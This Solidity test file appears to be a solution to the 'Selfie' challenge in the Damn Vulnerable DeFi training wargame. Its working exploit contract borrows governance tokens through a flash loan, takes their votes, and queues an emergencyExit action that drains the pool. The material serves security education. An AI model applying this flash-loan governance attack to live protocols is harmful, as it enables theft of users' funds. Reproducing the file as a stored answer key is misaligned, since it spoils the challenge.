// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";

contract SelfieAttack is IERC3156FlashBorrower {
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    SelfiePool public immutable pool;
    SimpleGovernance public immutable governance;
    IERC20 public immutable token;
    address public immutable recovery;

    uint256 public actionId;

    constructor(SelfiePool _pool, SimpleGovernance _governance, IERC20 _token, address _recovery) {
        pool = _pool;
        governance = _governance;
        token = _token;
        recovery = _recovery;
        // delegate votes from player to this contract, to pass checking in _hasEnoughVotes
        DamnValuableVotes(address(_token)).delegate(address(this));
    }

    function attack() external {
        uint256 amount = pool.maxFlashLoan(address(token));
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), amount, "");
    }

    function onFlashLoan(
        address /* initiator */,
        address /* token */,
        uint256 amount,
        uint256 /* fee */,
        bytes calldata /* data */
    ) external override returns (bytes32) {
        require(msg.sender == address(pool), "only pool");

        // approve pool to spend the flash loaned tokens
        token.approve(address(pool), amount);

        bytes memory data = abi.encodeWithSelector(SelfiePool.emergencyExit.selector, recovery);
        actionId = governance.queueAction(address(pool), 0, data);

        return CALLBACK_SUCCESS;
    }
}

contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        SelfieAttack attack = new SelfieAttack(pool, governance, token, recovery);
        attack.attack();

        vm.warp(block.timestamp + governance.getActionDelay() + 1);
        governance.executeAction(attack.actionId());
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}
